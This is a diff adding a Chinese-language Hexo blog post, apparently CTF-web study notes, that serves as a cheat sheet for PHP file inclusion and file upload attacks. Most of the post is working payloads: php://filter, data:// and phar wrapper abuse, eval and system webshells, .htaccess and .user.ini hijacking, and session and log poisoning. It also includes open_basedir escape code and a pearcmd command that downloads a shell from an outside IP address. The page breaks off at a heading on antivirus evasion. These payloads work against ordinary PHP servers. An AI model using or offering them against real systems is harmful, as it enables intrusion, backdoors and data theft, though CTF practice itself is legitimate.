@@ -1,0 +1,899 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>文件操作篇 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="文件包含 include() 文件的内容将作为 PHP 代码执行，找不到被包含的文件时只会产生警告，脚本将继续运行。 include_once() 唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 require() 找不到被包含的文件时会产生致命错误，并停止脚本运行。 require_once() 唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 若文件内容符合 PHP 语法规范">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件操作篇">
+<meta property="og:url" content="https://theganlove.github.io/2024/09/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%AF%87/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="文件包含 include() 文件的内容将作为 PHP 代码执行，找不到被包含的文件时只会产生警告，脚本将继续运行。 include_once() 唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 require() 找不到被包含的文件时会产生致命错误，并停止脚本运行。 require_once() 唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 若文件内容符合 PHP 语法规范">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-09-01T09:03:21.000Z">
+<meta property="article:modified_time" content="2024-09-01T09:12:57.341Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web php">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://theganlove.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-文件操作篇" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/09/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%AF%87/" class="article-date">
+  <time class="dt-published" datetime="2024-09-01T09:03:21.000Z" itemprop="datePublished">2024-09-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF-web/">CTF-web</a>►<a class="article-category-link" href="/categories/CTF-web/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">文件操作</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      文件操作篇
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><ul>
+<li><code>include()</code> 文件的内容将作为 PHP 代码执行，找不到被包含的文件时只会产生警告，脚本将继续运行。</li>
+<li><code>include_once()</code> 唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</li>
+<li><code>require()</code> 找不到被包含的文件时会产生致命错误，并停止脚本运行。</li>
+<li><code>require_once()</code> 唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</li>
+<li>若文件内容符合 PHP 语法规范，包含时不管扩展名是什么都会被 PHP 解析。若文件内容不符合 PHP 语法规范则会暴露其源码。</li>
+</ul>
+<h1 id="路径问题"><a href="#路径问题" class="headerlink" title="路径问题"></a>路径问题</h1><ul>
+<li><code>.</code>（单个点）：表示当前目录。例如，如果当前目录是 <code>/var/www/html</code>，那么 <code>./phpinfo.txt</code> 就表示 <code>/var/www/html/phpinfo.txt</code>。</li>
+<li><code>..</code>（两个点）：表示上一级目录。例如，如果当前目录是 <code>/var/www/html</code>，那么 <code>../phpinfo.txt</code> 就表示 <code>/var/www/phpinfo.txt</code>。</li>
+<li>如果是 PHP 文件 flag 最好用 base 读，txt 直接包含就行。</li>
+</ul>
+<h1 id="伪协议操作"><a href="#伪协议操作" class="headerlink" title="伪协议操作"></a>伪协议操作</h1><h3 id="file"><a href="#file" class="headerlink" title="file://"></a><code>file://</code></h3><ul>
+<li>条件：<ul>
+<li><code>allow_url_fopen</code>：不受影响</li>
+<li><code>allow_url_include</code>：不受影响</li>
+</ul>
+</li>
+<li>作用：用于访问本地文件系统。</li>
+<li>说明：<ul>
+<li><code>file://</code> 是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以 &#x2F;、\、\ 或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。</li>
+<li>在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code> 会可选地搜索，也作为相对的路径。</li>
+</ul>
+</li>
+<li>示例：<ul>
+<li><code>http://127.0.0.1/?filename=file:///etc/passwd</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="php"><a href="#php" class="headerlink" title="php://"></a><code>php://</code></h3><ul>
+<li>条件：<ul>
+<li><code>allow_url_fopen</code>：不受影响</li>
+<li><code>allow_url_include</code>：仅 <code>php://input</code>、<code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code> 需要 <code>on</code>。</li>
+</ul>
+</li>
+<li>作用：访问各个输入 &#x2F; 输出流（I&#x2F;O streams）</li>
+<li>说明：<ul>
+<li>PHP 提供了一些杂项输入 &#x2F; 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</li>
+<li><code>php://input</code> 可以访问请求的原始数据的只读流。如果启用了 <code>enable_post_data_reading</code> 选项，<code>php://input</code> 在使用 <code>enctype=&quot;multipart/form-data&quot;</code> 的 POST 请求中不可用。</li>
+<li><code>php://output</code> 只写的数据流，允许你以 <code>print</code> 和 <code>echo</code> 一样的方式写入到输出缓冲区。</li>
+<li><code>php://fd</code> (&gt;&#x3D;5.3.6) 允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</li>
+<li><code>php://memory</code>、<code>php://temp</code> (&gt;&#x3D;5.1.0) 类似文件包装器的数据流，允许读写临时数据。两者的一个区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。<code>php://temp</code> 的内存限制可通过添加 <code>/maxmemory:NN</code> 来控制，NN 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。</li>
+<li><code>php://filter/[read|write]=过滤器名称/resource=filename</code><ul>
+<li><code>read</code> 操作：在读取数据时应用过滤器。</li>
+<li><code>write</code> 操作：在写入数据时应用过滤器。</li>
+<li>过滤器：<ul>
+<li><code>string.rot13</code>：对数据进行 ROT13 变换。</li>
+<li><code>string.toupper</code>：将字符串转换为大写。</li>
+<li><code>string.tolower</code>：将字符串转换为小写。</li>
+<li><code>convert.base64-encode</code>：将数据进行 Base64 编码。</li>
+<li><code>convert.base64-decode</code>：将数据进行 Base64 解码。</li>
+<li><code>convert.quoted-printable-encode</code>：将数据进行 Quoted-Printable 编码。</li>
+<li><code>convert.quoted-printable-decode</code>：将数据进行 Quoted-Printable 解码。</li>
+<li><code>convert.iconv.UTF-8/ISO-8859-1</code>：将数据从 UTF-8 编码转换为 ISO-8859-1 编码（iconv 需要安装）。</li>
+<li><code>zlib.deflate</code>：对数据进行 DEFLATE 压缩。</li>
+<li><code>zlib.inflate</code>：对数据进行 DEFLATE 解压缩。</li>
+<li><code>zlib.encode</code>：对数据进行 gzip 编码。</li>
+<li><code>zlib.decode</code>：对数据进行 gzip 解码。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>resource=php://input</code>：读取请求的原始数据。</li>
+<li><code>resource=php://stdin</code>：读取标准输入。</li>
+<li><code>resource=php://stdout</code>：写入标准输出。</li>
+<li><code>resource=php://stderr</code>：写入标准错误输出。</li>
+</ul>
+</li>
+<li>示例：<ul>
+<li><code>file_put_contents(a,b)</code> 将 b 的内容写入 a 中，正好触发了 write</li>
+<li><code>file_get_contents()</code> 直接触发 read</li>
+</ul>
+</li>
+</ul>
+<h3 id="用-phar-协议"><a href="#用-phar-协议" class="headerlink" title="用 phar 协议"></a>用 phar 协议</h3><ul>
+<li>创建一个一句话木马文件 <code>1.php</code>，内容为：<code>&lt;?php @system($_GET[0]);?&gt;</code>。然后压缩成 zip 文件，随后修改后缀名为 <code>.png</code> 或者 <code>.jpg</code>，上传该文件。</li>
+<li>示例：<ul>
+<li><code>?file=phar://upload/1.jpg/1&amp;0=cat%20/f1aaaag</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="用-zip-协议"><a href="#用-zip-协议" class="headerlink" title="用 zip 协议"></a>用 zip 协议</h3><ul>
+<li>压缩成 zip 文件，随后修改后缀名为 <code>.png</code> 或者 <code>.jpg</code>，上传该文件。</li>
+<li>示例：<ul>
+<li><code>?file=zip://upload/1.jpg%231&amp;0=cat /f1aaggggg</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="绕过死亡-die"><a href="#绕过死亡-die" class="headerlink" title="绕过死亡 die"></a>绕过死亡 die</h3><ul>
+<li>需要 URL 编码：<ul>
+<li><code>GET: ?file=php://filter/write=convert.base64-decode/resource=1.php</code></li>
+<li><code>?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</code></li>
+</ul>
+</li>
+<li>需要 base64 编码，编码后最前面添加两个字母如：<code>aa</code>：<ul>
+<li><code>POST: content=&lt;?php system(&#39;cat f*&#39;);</code></li>
+<li><code>content=aaPD9waHAgcGhwaW5mbygpOz8+</code></li>
+</ul>
+</li>
+<li>或：<ul>
+<li>需要 URL 编码：<ul>
+<li><code>GET: ?file=php://filter/write=string.rot13/resource=1.php</code></li>
+<li><code>?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%32%25%32%65%25%37%30%25%36%38%25%37%30</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>需要 Rot13 编码：<ul>
+<li><code>POST: content=&lt;?php system(&#39;cat f*&#39;);</code></li>
+<li><code>content=&lt;?cuc cucvasb();?&gt;</code></li>
+</ul>
+</li>
+<li>或：<ul>
+<li><code>?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php</code></li>
+<li><code>/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%33%25%37%34%25%37%32%25%36%39%25%37%30%25%35%66%25%37%34%25%36%31%25%36%37%25%37%33%25%37%63%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30</code></li>
+<li><code>post传入 &lt;?php phpinfo();</code></li>
+<li><code>PD9waHAgcGhwaW5mbygpOw==</code></li>
+</ul>
+</li>
+<li>或：<ul>
+<li><code>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</code></li>
+<li><code>post: contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="文件包含配合伪协议"><a href="#文件包含配合伪协议" class="headerlink" title="文件包含配合伪协议"></a>文件包含配合伪协议</h1><ul>
+<li><code>include($file)</code></li>
+<li>示例：<ul>
+<li><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></li>
+<li><code>?file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%35%25%36%45%25%36%33%25%36%46%25%36%34%25%36%35/resource=flag.php   //二次编码解很多题</code></li>
+<li><code>?data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code></li>
+<li><code>?file=data://text/plain;base64,PD89c3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==   //&lt;?=system(&#39;tac flag.php&#39;);?&gt;</code></li>
+<li><code>?file=php://filter/convert.iconv.ASCII.UCS-2BE/resource=flag.php</code></li>
+<li><code>?file=compress.zlib:///var/www/html/flag.php</code></li>
+<li><code>compress.zlib://data:@baidu.com/baidu.com,phpinfo() 构造思路：</code>@<code>使</code>data:<code>被解释为用户名和密码 baidu.com/baidu.com 只要它包含了 /，通常被认为是合法的 media-type。作为有效的压缩流，而是将整个 URL 作为字面文本读取了。file_get_contents结果是phpinfo()</code></li>
+<li><code>?file=phar://test.zip/shell.txt   //相对路径 phar	把shell.txt压缩成test.zip文件</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="包含-htaccess-文件"><a href="#包含-htaccess-文件" class="headerlink" title="包含 .htaccess 文件"></a>包含 .htaccess 文件</h1><ul>
+<li>示例：<ul>
+<li><code>php_value auto_append_file /tmp/webshell.txt</code></li>
+<li><code>php_value auto_append_file /temp/sess_xxxxxx</code></li>
+<li><code>先执行其他php完再包含/tmp/webshell</code></li>
+<li><code>自己包含自己会将注释句子一起执行</code></li>
+<li><code>php_value auto_append_file .htaccess</code></li>
+<li><code>#&lt;?php echo(123);eval($_POST[0]);?&gt;</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="见到-shtml-考虑-ssi"><a href="#见到-shtml-考虑-ssi" class="headerlink" title="见到 shtml 考虑 ssi"></a>见到 shtml 考虑 ssi</h1><ul>
+<li>示例：<ul>
+<li><code>.htaccess</code></li>
+<li><code>AddType text/html .shtml</code></li>
+<li><code>AddHandler server_parsed .shtml</code></li>
+<li><code>Options Includes</code></li>
+<li><code>1.shtml</code></li>
+<li><code>&lt;pre&gt;</code></li>
+<li><code>&lt;!--#exec cmd=&quot;whomai&quot;--&gt;</code></li>
+<li><code>&lt;/pre&gt;</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="传统条件竞争不可取"><a href="#传统条件竞争不可取" class="headerlink" title="传统条件竞争不可取"></a>传统条件竞争不可取</h1><ul>
+<li>示例：<ul>
+<li><code>条件竞争php7.0</code></li>
+<li><code>file=php://filter/strip_tags/resource=/ect/passwd  会报错不执行</code></li>
+<li><code>post传文件就直接永久保存下来，在phpinfo界面找file包含即可</code></li>
+<li><code>自包含(题中的包含或者.htaccess包含 php_value auto_append_file 1.txt)，上传，phpinfo页面，这几个保证在一个界面，在自包含下给phpinfo界面传文件，</code></li>
+<li><code>自包含shell</code></li>
+<li><code>1.txt</code></li>
+<li><code>&lt;?</code></li>
+<li><code>echo (&#39;1.txt is ready&#39;);</code></li>
+<li><code>file_put_contents(&#39;/tmp/shell.php&#39;,&#39;&lt;?php echo(&#39;haha,is OK&#39;);eval($_POST[0]);?&gt;&#39;);</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h1><ul>
+<li>示例：<ul>
+<li><code>/var/log/nginx/access.log，利用ua头即可包含</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="包含-environ-文件"><a href="#包含-environ-文件" class="headerlink" title="包含 environ 文件"></a>包含 environ 文件</h1><ul>
+<li>条件：<ul>
+<li><code>php以cgi方式运行，这样environ才会保持UA头。</code></li>
+<li><code>environ文件存储位置已知，且environ文件可读。</code></li>
+<li><code>每个用户都有属于自己的environ环境</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="session-文件包含"><a href="#session-文件包含" class="headerlink" title="session 文件包含"></a>session 文件包含</h1><ul>
+<li>示例：<ul>
+<li><code>能赋值就直接赋值包含</code></li>
+<li><code>不行就进度条</code></li>
+<li><code>/tem/sess_PHPSESSID</code></li>
+<li><code>/var/lib/php/session/sess_PHPSESSID</code></li>
+<li><code>这里的PHPSESSID是cookie当用户控制时（session.use_struct_mode开）随便写入，利用session进度条，利用写的HTML，随便传抓包，确保有Cookie: PHPSESSID=xxxxxxx并找到其位置  /sess_xxxxxx</code></li>
+<li><code>默认是一直删除，所以一直重发session页面的包，并且一直重发包含session文件的页面包含进去</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="pear-文件包含"><a href="#pear-文件包含" class="headerlink" title="pear 文件包含"></a>pear 文件包含</h1><ul>
+<li>条件：<ul>
+<li><code>1 有文件包含点</code></li>
+<li><code>2 开启了pear扩展</code></li>
+<li><code>3 配置文件中register_argc_argv 设置为On,而默认为Off</code></li>
+</ul>
+</li>
+<li>说明：<ul>
+<li><code>PEAR扩展</code></li>
+<li><code>PHP Extension and Application Repository</code></li>
+<li><code>默认安装位置是  /usr/local/lib/php/</code></li>
+<li><code>包含测试?file=/usr/local/lib/php/pearcmd.php&amp;version</code></li>
+</ul>
+</li>
+<li>利用 Pear 扩展进行文件包含<ul>
+<li>方法一 远程文件下载<ul>
+<li>示例：<ul>
+<li><code>?file=/usr/local/lib/php/pearcmd.php&amp;ctfshow+install+-R+/var/www/html/+http://47.236.120.83/shell.php  //shell密码是cmd</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>方法二 生成配置文件，配置项传入我们恶意的php代码的形式<ul>
+<li>上传 <code>ctfshow.php</code><ul>
+<li>示例：<ul>
+<li><code>a=b</code></li>
+<li><code>username=root</code></li>
+<li><code>man_dir=&lt;?php eval($_POST[1]);?&gt;</code></li>
+</ul>
+</li>
+<li>示例：<ul>
+<li><code>GET /?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/ctf.php+-d+man_dir=&lt;?eval($_POST[1]);?&gt;+-s+</code></li>
+</ul>
+</li>
+<li>然后直接利用密码是1</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>方法三 写配置文件方式<ul>
+<li>示例：<ul>
+<li><code>GET /?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=</code>$_POST[1]<code>;?&gt;+1.php</code></li>
+<li>访问 <code>http://&lt;靶场服务器IP&gt;/1.php</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><ul>
+<li>说明：<ul>
+<li>通过域转数字的形式，可以不用.来构造远程文件地址</li>
+<li>示例：<ul>
+<li><code>http://www.msxindl.com/tools/ip/ip_num.asp</code></li>
+<li><code>?file=http://731540450/1</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="open-basedir-突破"><a href="#open-basedir-突破" class="headerlink" title="open_basedir 突破"></a>open_basedir 突破</h1><ul>
+<li>说明：<ul>
+<li>利用闭合直接 <code>glob</code> 获取根目录的文件名</li>
+<li>示例：<ul>
+<li><code>?&gt;&lt;?php</code></li>
+<li><code>var_dump(scandir(&#39;glob:///*&#39;));?&gt;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>或者利用 <code>glob+DirectoryIterator</code> 获取根目录的文件名，新建 <code>glob.php</code> 文件，内容如下<ul>
+<li>示例：<ul>
+<li><code>&lt;?php</code></li>
+<li><code>$it = new DirectoryIterator(&quot;glob:///*&quot;);</code></li>
+<li><code>foreach($it as $f) &#123;</code></li>
+<li><code>echo $f-&gt;__toString().&quot;&lt;br/&gt;&quot;;</code></li>
+<li><code>&#125;</code></li>
+<li><code>直接通过蚁剑链接，将glob.php上传再访问找到flag名</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>利用 <code>ini_set、mkdir、chdir</code> 来获取文件内容，新建 <code>flag.php</code> 文件，内容如下<ul>
+<li>示例：<ul>
+<li><code>&lt;?php</code></li>
+<li><code>mkdir(&#39;tmpdir&#39;); chdir(&#39;tmpdir&#39;);</code></li>
+<li><code>ini_set(&#39;open_basedir&#39;,&#39;..&#39;);</code></li>
+<li><code>chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;);</code></li>
+<li><code>ini_set(&#39;open_basedir&#39;,&#39;/&#39;);</code></li>
+<li><code>$a=file_get_contents(&#39;/f11aggg&#39;);</code></li>
+<li><code>var_dump($a);</code></li>
+<li><code>?&gt;</code></li>
+<li>访问即可得到flag</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="nginx-大文件上传缓存文件利用"><a href="#nginx-大文件上传缓存文件利用" class="headerlink" title="nginx 大文件上传缓存文件利用"></a>nginx 大文件上传缓存文件利用</h1><h1 id="pcache-扩展生成缓存文件利用"><a href="#pcache-扩展生成缓存文件利用" class="headerlink" title="pcache 扩展生成缓存文件利用"></a>pcache 扩展生成缓存文件利用</h1><ul>
+<li>有任意文件读取，前面双写绕过&#x2F;.的过滤</li>
+<li>示例：<ul>
+<li><code>/?tpl=...//...//...//...//...//...//...//...//etc/passwd</code></li>
+</ul>
+</li>
+<li>flag 在 <code>flag.php</code> 里，源码对最后一个.后的后缀名进行判断，无法直接绕过读取flag.php，查看phpinfo</li>
+<li>示例：<ul>
+<li><code>/?tpl=debug</code></li>
+<li><code>发现开启了opcache，它会缓存php文件进入指定缓存文件夹，路径为缓存文件夹/[system_id]/var/www/html/flag.php.bin</code></li>
+<li>只要访问这个bin文件即可绕过后缀过滤，查看phpinfo发现缓存文件夹为 <code>/var/www/a/</code></li>
+<li>主要是计算 <code>system_id</code>，有现成工具 <code>php7-opcache-override(https://github.com/GoSecure/php7-opcache-override)</code></li>
+<li><code>用法：</code><ul>
+<li><code>python3 system_id_scraper.py info.html 或者 python3 system_id_scraper.py url</code></li>
+<li><code># info.html为phpinfo的前端信息界面另存为所得</code></li>
+<li><code># url为phpinfo地址</code></li>
+<li>示例：<ul>
+<li><code>算出system_id为1116d566fdc53f79abce6c01e3a0308d</code></li>
+<li><code>所以先访问flag.php使其产生缓存文件（这一步必须要），之后执行访问如下进行包含即可</code></li>
+<li><code>/?tpl=...//...//...//...//...//...//...//...//var/www/a/1116d566fdc53f79abce6c01e3a0308d/var/www/html/flag.php.bin</code></li>
+<li><code>#flag&#123;Opcache_Succ_ess!!&#125;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id=""><a href="#" class="headerlink" title="&lt;?php 的绕过"></a><code>&lt;?php</code> 的绕过</h2><ul>
+<li>示例：<ul>
+<li><code>&lt;?=</code> </li>
+<li><code>&lt;script language=&#39;php&#39;&gt;phpinfo();&lt;/script&gt;</code></li>
+<li><code>&lt;% phpinfo();%&gt; //asp tag少</code></li>
+</ul>
+</li>
+<li>思路是找过滤，是内容还是后缀，是白还是黑</li>
+</ul>
+<h2 id="前端-js-检查"><a href="#前端-js-检查" class="headerlink" title="前端 js 检查"></a>前端 js 检查</h2><ul>
+<li>示例：<ul>
+<li>后改为 bp</li>
+<li>图片头 <code>GIF89A</code> 为第一行</li>
+<li>加入带马的图片</li>
+</ul>
+</li>
+</ul>
+<h3 id="shell-总结"><a href="#shell-总结" class="headerlink" title="shell 总结"></a>shell 总结</h3><ul>
+<li>示例：<ul>
+<li><code>&lt;?echo (&#39;123&#39;);eval($_POST[0]);?&gt;</code></li>
+<li><code>&lt;?=eval($_POST&#123;1&#125;);?&gt; //过滤[]</code></li>
+<li><code>&lt;?=system(&#39;tac ../f*&#39;)?&gt; //过滤&#123;&#125;[]</code></li>
+<li><code>&lt;script language=”php”&gt;echo &#39;123&#39;; &lt;/script&gt;</code></li>
+<li><code>&lt;?= eval(array_pop($_REQUEST))?&gt;</code></li>
+<li><code>&lt;?= @eval(array_pop($_POST))?&gt; //传1=system(&#39;ls /&#39;)</code></li>
+<li>上传完shell无论是jpg还是php直接包含</li>
+<li>示例：<ul>
+<li><code>?file=upload/1.jpg&amp;0=tac%20Flag_is_here_acffd72.php</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><ul>
+<li>示例：<ul>
+<li><code>利用fuzz方法快速测试可上传后缀：upload-fuzz-dic-builder()</code></li>
+<li>项目地址：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a></li>
+<li>用法：<code>python2 upload-fuzz-dic-builder.py -n shell -a jpg  -l php -m apache --os linux  -o upload_file.txt</code></li>
+<li>双写：<ul>
+<li>php后缀名大小写、点绕过、空格绕过、::$DATA绕过、冒号绕过（Windows特性）</li>
+<li>php支持的可解析别名：php2, php3, php4, php5, phps, pht, phtm, phtml</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>.user.ini</code> 上传，先发图片再改为这个 <code>.user.ini</code> 名字<ul>
+<li>但是这种方式其实是有个前提的，因为 <code>.user.ini</code> 只对他同一目录下的文件起作用，也就是说，只有他同目录下有php文件才可以。</li>
+<li>示例：<ul>
+<li><code>1.写入内容auto_prepend_file=1.txt 再上传1.txt的马不行就写&lt;?=eval($_COOKIE[1]); 传COOKIE：1=eval(base64_decode(&#39;cGhwaW5mbygpOw==&#39;))?&gt;</code></li>
+<li><code>2.写入内容auto_prepend_file=php://input</code></li>
+<li><code>上传完直接随便发个东西在bp直接传码就行</code></li>
+<li><code>3.写入内容auto_prepend_file=/var/log/nginx/access.log</code></li>
+<li><code>上传后ua写码&lt;?php eval($_POST[1]);?&gt;木马，插入日志后就不写ua头直接rce就行，POST不行就COOKIE&lt;?php eval($_COOKIE[1]);?&gt; 1=eval(base64_decode(&#39;&#39;))?&gt;COOKIE不解析空格</code></li>
+<li><code>4..user.ini写入内容</code></li>
+<li><code>GIF89a</code></li>
+<li><code>auto_prepend_file=/tmp/sess_shell</code></li>
+<li><code>用session进度条post发包并拦截，马是&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;</code></li>
+<li><code>改Cookie:PHPSESSID=shell,在PHP_SESSION_UPLOAD_PROGRESS的主体的最后一行写&lt;?php fwrite(fopen(&#39;1.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#39;);?&gt;</code></li>
+<li><code>将该POST数据包与访问upload目录的GET数据包进行条件竞争，访问upload的数据包长度发生变化即创建后门文件成功</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>.htaccess</code> 文件<ul>
+<li>方式1：<ul>
+<li><code>AddType application/x-httpd-php .png   //将.png后缀的文件解析 成php</code></li>
+<li>还支持 <code>AddType application/x-httpd-ph\p .png</code></li>
+</ul>
+</li>
+<li>方式2：<ul>
+<li><code>&lt;FilesMatch &quot;png&quot;&gt;</code></li>
+<li><code>SetHandler application/x-httpd-php</code></li>
+<li><code>&lt;/FilesMatch&gt;</code></li>
+<li>如果flag不是php文件，那么还可以像 <code>.user.ini</code> 一样在当前目录加载一个文件</li>
+<li>示例：<ul>
+<li><code>php_value auto_append_file &#39;flag&#39;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>基于 <code>.htaccess</code> 的盲注</li>
+</ul>
+</li>
+</ul>
+<h2 id="基础免杀"><a href="#基础免杀" class="headerlink" title="基础免杀"></a>基础免杀</h2><ul>
+<li>示例：<ul>
+<li><code>&lt;?php</code></li>
